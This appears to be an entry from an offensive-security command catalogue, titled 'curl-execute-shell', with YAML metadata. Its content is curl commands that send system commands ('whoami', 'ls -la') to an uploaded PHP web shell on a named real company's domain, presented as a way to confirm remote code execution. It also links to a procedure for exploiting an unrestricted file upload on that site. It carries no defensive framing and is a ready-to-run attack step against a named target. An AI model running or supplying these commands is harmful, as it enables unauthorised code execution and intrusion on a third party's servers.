---
data: 'curl "https://www.semrush.com/uploads/shell.php?cmd=whoami"'
tags:
  - rce
  - web-shell
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.765Z'
id: ce3419f1-8be1-4295-9935-d0b8e391b0a6
verified: false
validated: true
submitted: true
---
# curl-execute-shell

## Command

```bash
curl "https://www.semrush.com/uploads/shell.php?cmd=whoami"
```

## Description

This command accesses an uploaded PHP shell to execute a system command (e.g., whoami) via a GET parameter, verifying remote code execution on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"https://...shell.php?cmd=whoami"` | URL of the shell with command parameter | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.semrush.com/uploads/shell.php?cmd=whoami"
```

### Advanced Usage

```bash
curl "https://www.semrush.com/uploads/shell.php?cmd=ls -la" -b cookies.txt
```

## Expected Output

Output of the command, e.g., 'www-data' or 'apache' if successful; blank or error if the shell is not executable.

## Related

- [[Related Procedure|procedures/Exploit-Unrestricted-File-Upload-in-Semrush-My-Reports]]
